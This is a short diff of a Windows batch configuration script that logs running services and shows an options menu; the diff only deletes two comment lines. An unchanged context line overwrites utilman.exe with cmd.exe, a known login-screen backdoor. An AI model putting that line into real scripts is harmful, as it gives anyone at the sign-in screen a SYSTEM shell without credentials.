@@ -12,7 +12,6 @@ set mypath=%~dp0
 ::pause
 ::exit 
 ::)
-::Tes t 
 
 
 mkdir C:\Wangblows
@@ -81,7 +80,7 @@ copy /y "%systemroot%\System32\cmd.exe" "%systemroot%\System32\utilman.exe"
 net start >> C:\Wangblows\Services_Started.txt
 if %errorlevel%==1 echo Running services failed to write >> C:\Wangblows\Wangblows.txt
 
-::test michael is bi bi bii
+
 :MENU
 echo Choose an Option:
 echo 1. Enable Auto-Update
